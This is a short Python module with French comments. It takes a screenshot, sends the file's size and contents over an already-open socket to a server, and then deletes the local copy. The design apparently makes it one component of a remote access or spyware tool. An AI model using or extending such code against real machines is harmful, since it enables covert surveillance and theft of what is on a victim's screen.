# screenshot_module.py

import os
from screenshots import screenshot

def take_and_send_screenshot(sock):
    """
    Prend une capture d'écran, l'envoie au serveur, puis supprime le fichier temporaire.
    """
    print("[+] Capture d'écran demandée...")
    filename = screenshot()
    filesize = os.path.getsize(filename)

    sock.sendall(str(filesize).encode().ljust(16))

    with open(filename, "rb") as f:
        sock.sendall(f.read())

    os.remove(filename)
    print("[+] Capture d'écran envoyée et fichier temporaire supprimé.")
